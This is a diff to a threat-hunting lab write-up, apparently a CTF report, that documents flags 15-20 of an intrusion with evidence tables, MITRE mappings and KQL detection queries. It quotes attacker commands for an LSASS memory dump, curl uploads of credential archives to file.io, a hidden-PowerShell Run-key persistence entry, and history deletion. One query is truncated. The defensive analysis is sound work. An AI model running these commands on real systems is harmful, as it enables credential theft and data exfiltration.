@@ -856,40 +856,67 @@ DeviceFileEvents
 <hr>
 <br>
 
-### 🚩 Flag #
+### 🚩 Flag #15: CREDENTIAL ACCESS - Memory Dump Command
 **🎯 Objective**  
-
+The complete process memory dump command line is critical evidence showing exactly how credentials were extracted.
 
 **📌 Finding**  
 
+"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp"
 
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
+| Host             | 
+azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:24:44.3906047Z            |
+| Process          | pd.exe                   |
+| Parent Process   | "powershell.exe"                      |
+| Command Line     | '"pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp'              |
 
 **💡 Why it matters**  
-Tgergergergregergergegergerg
+Dumping the memory of LSASS (Local Security Authority Subsystem Service) is one of the most reliable indicators of credential theft on Windows systems. LSASS stores sensitive authentication material including plaintext credentials, NTLM hashes, and Kerberos tickets for logged-on users.
+
+In this case, the attacker used a renamed credential dumping tool (pd.exe) with explicit memory dump arguments (-ma) to target the LSASS process, confirming intentional credential access rather than accidental or benign behavior. Writing the dump file to a disguised staging directory (C:\Windows\Logs\CBS) further demonstrates attacker OPSEC and an attempt to evade casual inspection.
+
+This activity maps directly to MITRE ATT&CK T1003.001 – OS Credential Dumping: LSASS Memory, a high-impact technique frequently used to enable privilege escalation, lateral movement, and full domain compromise. Detection of LSASS dumping should be treated as a containment-critical event.
 
 **🔧 KQL Query Used**
 ```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "pd.exe"
+| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, FileName, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
 
 ```
 **🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
+<img width="1764" height="283" alt="image" src="https://github.com/user-attachments/assets/f99807a4-ff55-422d-bb73-744b73a4fe3a" />
+
 
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
+When hunting for credential dumping, prioritize behavior over tool names. Attackers frequently rename utilities like ProcDump to evade signature-based detections, but LSASS dumping still requires distinctive command-line flags and access patterns. Focus on memory dump arguments (-ma, MiniDump, .dmp) combined with references to LSASS or dump files written to nonstandard directories.
+
 ```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where ProcessCommandLine has_any ("lsass", "-ma", ".dmp")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          FileName,
+          ProcessCommandLine,
+          InitiatingProcessCommandLine,
+          FolderPath
+| order by TimeGenerated desc
 
 ```
 
@@ -897,41 +924,65 @@ wfwfewfwefwefweewwefewfwefwewefwef
 <hr>
 <br>
 
-### 🚩 Flag #
+### 🚩 Flag #16: EXFILTRATION - Upload Command
 **🎯 Objective**  
-
+Command-line HTTP clients enable scriptable data transfers. The complete command syntax is essential for building detection rules.
 
 **📌 Finding**  
-
+curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io  
 
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
+| Host             | azuki-fileserver01                    |
+| Timestamp        | 2025-11-22T01:59:54.2755596Z            |
+| Process          | curl.exe                   |
+| Parent Process   | powershell.exe                      |
+| Command Line     | curl.exe" -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io                 |
 
 **💡 Why it matters**  
-Tgergergergregergergegergerg
+The use of curl.exe to upload an archive to an external file-sharing service represents a clear data exfiltration action, not preparation or staging. Command-line HTTP clients allow attackers to automate transfers, bypass browser-based controls, and operate quietly through scripts or living-off-the-land binaries.
+
+In this case, the attacker exfiltrated a compressed archive (credentials.tar.gz) from a disguised staging directory, confirming that previously collected and compressed credential material was successfully moved off the host. The destination, file.io, is a legitimate but commonly abused public file-sharing service, making this traffic blend into normal outbound HTTPS activity.
+
+This behavior aligns with MITRE ATT&CK T1048.003 – Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Channel, and marks a critical point where sensitive data has already left the environment.
 
 **🔧 KQL Query Used**
 ```
-
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceProcessEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ProcessCommandLine contains "http"
+| project TimeGenerated, DeviceName, ActionType, ProcessCommandLine, FileName, InitiatingProcessCommandLine, FolderPath
+| order by TimeGenerated desc
 ```
 **🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
+<img width="1750" height="239" alt="image" src="https://github.com/user-attachments/assets/90aafcc2-13fe-40e0-99a6-8214f168d4d0" />
+
 
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
-```
+Focus hunts on outbound data transfers initiated by scripting engines or command-line utilities rather than relying solely on destination reputation. File uploads using curl.exe or similar tools (wget, Invoke-WebRequest) combined with archive file extensions and public file-sharing domains are strong indicators of hands-on-keyboard exfiltration activity.
 
+```
+DeviceProcessEvents
+| where TimeGenerated > ago(30d)
+| where FileName in ("curl.exe", "wget.exe")
+| where ProcessCommandLine has_any ("http", "https", "-F", "--upload-file")
+| where ProcessCommandLine has_any (".zip", ".tar", ".tar.gz", ".7z", ".rar")
+| where InitiatingProcessFileName in ("powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          FileName,
+          ProcessCommandLine,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
 <br>
@@ -939,125 +990,62 @@ wfwfewfwefwefweewwefewfwefwewefwef
 <br>
 
 
-### 🚩 Flag #
+### 🚩 Flag #17 EXFILTRATION - Cloud Service
 **🎯 Objective**  
-
+Cloud file sharing services provide convenient, anonymous exfiltration channels that blend with legitimate business traffic.
 
 **📌 Finding**  
-
+file.io
 
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
+| Host             | azuki-fileserver01                  |
+| Timestamp        | 2025-11-22T02:25:37.9206525Z            |
+| Process          | curl.exe                  |
+| Parent Process   | powershell                    |
+| Command Line     | "curl.exe" -F file=@C:\Windows\Logs\CBS\lsass.dmp https://file.io               |
 
 **💡 Why it matters**  
-Tgergergergregergergegergerg
+Exfiltrating data to public cloud file-sharing services represents a high-risk data loss scenario because these platforms are widely trusted, encrypted, and commonly allowed through perimeter controls. Attackers favor services like file.io because uploads occur over standard HTTPS, making the traffic difficult to distinguish from legitimate business activity without endpoint context.
+
+In this case, the attacker uploaded a full LSASS memory dump, which almost certainly contains cached credentials, NTLM hashes, or Kerberos material. This confirms not just successful credential access, but successful credential theft and removal from the environment, eliminating any opportunity for recovery through containment alone.
+
+This behavior aligns with MITRE ATT&CK T1567.002 – Exfiltration Over Web Service: Exfiltration to Cloud Storage, and represents a late-stage breach milestone where incident response urgency is critical.
 
 **🔧 KQL Query Used**
 ```
-
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceNetworkEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RemoteIP, RemoteUrl, ActionType, InitiatingProcessFileName, InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 **🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
+<img width="1538" height="212" alt="image" src="https://github.com/user-attachments/assets/7de50878-c6cf-4a05-85a1-279ed2de406a" />
 
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
+Hunt for endpoint-initiated connections to public file-sharing services that originate from scripting engines or command-line tools rather than browsers. Prioritize uploads involving sensitive file types such as memory dumps, archives, or database exports, especially when correlated with prior credential dumping or compression activity.
 ```
-
-```
-
-<br>
-<hr>
-<br>
-
-
-### 🚩 Flag #
-**🎯 Objective**  
-
-
-**📌 Finding**  
-
-
-
-**🔍 Evidence**
-
-| Field            | Value                                      |
-|------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
-
-**💡 Why it matters**  
-Tgergergergregergergegergerg
-
-**🔧 KQL Query Used**
-```
-
-```
-**🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
-
-
-**🛠️ Detection Recommendation**
-
-**Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
-```
-
-```
-
-<br>
-<hr>
-<br>
-
-
-### 🚩 Flag #
-**🎯 Objective**  
-
-
-**📌 Finding**  
-
-
-
-**🔍 Evidence**
-
-| Field            | Value                                      |
-|------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
-
-**💡 Why it matters**  
-Tgergergergregergergegergerg
-
-**🔧 KQL Query Used**
-```
-
-```
-**🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
-
-
-**🛠️ Detection Recommendation**
-
-**Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
-```
-
+DeviceNetworkEvents
+| where TimeGenerated > ago(30d)
+| where RemoteUrl has_any ("file.io", "transfer.sh", "anonfiles", "gofile", "pastebin")
+| where InitiatingProcessFileName in ("curl.exe", "powershell.exe", "cmd.exe")
+| where InitiatingProcessCommandLine has_any (".dmp", ".zip", ".tar", ".tar.gz", ".7z")
+| project TimeGenerated,
+          DeviceName,
+          AccountName,
+          RemoteUrl,
+          RemoteIP,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
 <br>
@@ -1106,42 +1094,185 @@ wfwfewfwefwefweewwefewfwefwewefwef
 <hr>
 <br>
 
-### 🚩 Flag #
-**🎯 Objective**  
 
+### 🚩 Flag #18: PERSISTENCE - Registry Value Name
+**🎯 Objective**  
+Registry autorun keys provide reliable persistence that executes on every system startup or user logon.
 
 **📌 Finding**  
 
+FileShareSync
 
 
 **🔍 Evidence**
 
 | Field            | Value                                      |
 |------------------|--------------------------------------------|
-| Host             | agfregergegerg                    |
-| Timestamp        | 242342342342342             |
-| Process          | xcsfsfwewefw                    |
-| Parent Process   | posfwwefwfwefwe                      |
-| Command Line     | `"xsfsfwefwefwefwefewfwewefew`                 |
+| Host             | azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:10:50.8253766Z           |
+| Process          | reg.exe                   |
+| Parent Process   | powershell                      |
+| Command Line     | `reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`                 |
 
 **💡 Why it matters**  
-Tgergergergregergergegergerg
+Registry Run keys provide one of the most reliable and low-noise persistence mechanisms available to attackers, as they guarantee execution on every system startup or user logon. By choosing the value name FileShareSync, the attacker deliberately blends into expected enterprise software naming conventions, reducing the likelihood of casual discovery by administrators or users.
+
+The associated command launches a hidden PowerShell process that executes a script from a nonstandard system path, indicating continued control rather than a one-time payload. This persistence occurs after credential access and data exfiltration, strongly suggesting the attacker intends to maintain long-term access for follow-on operations or re-entry.
+
+This behavior maps directly to MITRE ATT&CK T1547.001 – Boot or Logon Autostart Execution: Registry Run Keys, a technique commonly observed in hands-on-keyboard intrusions and ransomware precursor activity.
 
 **🔧 KQL Query Used**
 ```
-
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceRegistryEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RegistryValueName, RegistryKey, RegistryValueData, InitiatingProcessCommandLine
 ```
 **🖼️ Screenshot**
-fwefwewfwefwewefwfwfwefwfwf
+<img width="1532" height="184" alt="image" src="https://github.com/user-attachments/assets/bda95703-7808-4a53-9028-c16b7f870f80" />
+
 
 
 **🛠️ Detection Recommendation**
 
 **Hunting Tip:**  
-wfwfewfwefwefweewwefewfwefwewefwef
+Use this query to proactively identify newly created or modified Run key values, especially those added via command-line tools like reg.exe or PowerShell. Pay close attention to value names that appear legitimate but point to scripts, hidden PowerShell execution, or binaries located outside standard program directories. Correlating these events with earlier credential access or exfiltration activity significantly increases detection confidence.
+```
+DeviceRegistryEvents
+| where TimeGenerated > ago(30d)
+| where ActionType == "RegistryValueSet"
+| where RegistryKey has @"\Software\Microsoft\Windows\CurrentVersion\Run"
+| where InitiatingProcessFileName in ("reg.exe", "powershell.exe", "cmd.exe")
+| project TimeGenerated,
+          DeviceName,
+          RegistryValueName,
+          RegistryKey,
+          RegistryValueData,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
 ```
 
+<br>
+<hr>
+<br>
+
+
+### 🚩 Flag #19: PERSISTENCE - Beacon Filename
+**🎯 Objective**  
+Process masquerading involves naming malicious files after legitimate Windows components to avoid suspicion.
+
+**📌 Finding**  
+svchost.ps1
+
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | azuki-fileserver01                   |
+| Timestamp        | 2025-11-22T02:10:50.8253766Z           |
+| Process          | reg.exe                   |
+| Parent Process   | powershell                      |
+| Command Line     | `reg.exe" add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v FileShareSync /t REG_SZ /d "powershell -NoP -W Hidden -File C:\Windows\System32\svchost.ps1" /f`                 |
+
+**💡 Why it matters**  
+Masquerading malicious payloads as legitimate Windows components is a deliberate evasion technique designed to bypass both human review and basic security controls. By naming the beacon svchost.ps1, the attacker abuses trust in the well-known svchost.exe process, increasing the likelihood that the file will be overlooked during triage or routine audits.
+
+Placing this script in C:\Windows\System32 further strengthens the disguise, as files in this directory are typically assumed to be trusted and system-managed. When combined with a registry Run key, this filename choice enables stealthy, long-term persistence with minimal operational noise.
+
+This activity aligns with MITRE ATT&CK T1036.005 – Masquerading: Match Legitimate Name or Location, a common technique in post-exploitation phases where attackers prioritize survivability over speed.
+
+**🔧 KQL Query Used**
 ```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceRegistryEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| project TimeGenerated, DeviceName, RegistryValueName, RegistryKey, RegistryValueData, InitiatingProcessCommandLine
+```
+**🖼️ Screenshot**
+<img width="1532" height="184" alt="image" src="https://github.com/user-attachments/assets/bda95703-7808-4a53-9028-c16b7f870f80" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Hunt for script files (.ps1, .vbs, .js) located in system directories such as System32 or Windows\Logs, especially when referenced by autorun registry keys. Filenames that closely resemble legitimate Windows binaries (e.g., svchost, lsass, services) but use scripting extensions are high-confidence indicators of malicious persistence.
+```
+DeviceFileEvents
+| where TimeGenerated > ago(30d)
+| where FolderPath has_any ("\\Windows\\System32", "\\Windows\\SysWOW64")
+| where FileName endswith ".ps1"
+| where FileName has_any ("svchost", "lsass", "services", "winlogon")
+| project TimeGenerated,
+          DeviceName,
+          FileName,
+          FolderPath,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
+<br>
+<hr>
+<br>
+
+### 🚩 Flag #20: ANTI-FORENSICS - History File Deletion
+**🎯 Objective**  
+PowerShell saves command history to persistent files that survive session termination. Attackers target these files to cover their tracks.
+
+**📌 Finding**  
+ConsoleHost_history.txt
+
+**🔍 Evidence**
+
+| Field            | Value                                      |
+|------------------|--------------------------------------------|
+| Host             | ConsoleHost_history.txt                  |
+| Timestamp        | 2025-11-22T02:26:01.1661095Z           |
+| Process          | powershell.exe                   |
+| Parent Process   | explorer.exe                     |
+| Command Line     | N/A                 |
+
+**💡 Why it matters**  
+PowerShell maintains a persistent command history file (ConsoleHost_history.txt) specifically to support forensic reconstruction after an interactive session ends. Deleting this file is a deliberate anti-forensics action intended to erase evidence of executed commands, tooling, and operator intent.
+
+This behavior is rarely performed during normal administrative activity and typically occurs after credential access, persistence, or lateral movement—once the attacker is attempting to reduce visibility and slow incident response. The timing of this deletion shortly after malicious PowerShell activity strongly suggests an effort to conceal hands-on-keyboard operations.
+
+This activity maps to MITRE ATT&CK T1070.003 – Indicator Removal on Host: Clear Command History, a common cleanup technique used by post-compromise operators to frustrate forensic timelines and hinder root cause analysis.
+
+**🔧 KQL Query Used**
+```
+let timeattack5 = todatetime('2025-11-22T02:03:19.9845969Z');
+DeviceFileEvents
+| where TimeGenerated between ((timeattack5 - 1h) .. (timeattack5 + 1h))
+| where DeviceName contains "azuki"
+| where ActionType == "FileDel
+```
+**🖼️ Screenshot**
+<img width="1529" height="372" alt="image" src="https://github.com/user-attachments/assets/03889e2d-5056-4e60-950e-fb1028567824" />
+
+
+**🛠️ Detection Recommendation**
+
+**Hunting Tip:**  
+Monitor for deletion or truncation of PowerShell history files, particularly when initiated by powershell.exe or shortly following suspicious PowerShell execution. Correlate these events with credential access, registry persistence, or suspicious script execution to identify full attack chains.
+```
+DeviceFileEvents
+| where TimeGenerated > ago(30d)
+| where ActionType in ("FileDeleted", "FileDeletedByProcess")
+| where FileName =~ "ConsoleHost_history.txt"
+| project TimeGenerated,
+          DeviceName,
+          FileName,
+          FolderPath,
+          InitiatingProcessFileName,
+          InitiatingProcessCommandLine
+| order by TimeGenerated desc
+```
+
 
 <br>
 <hr>
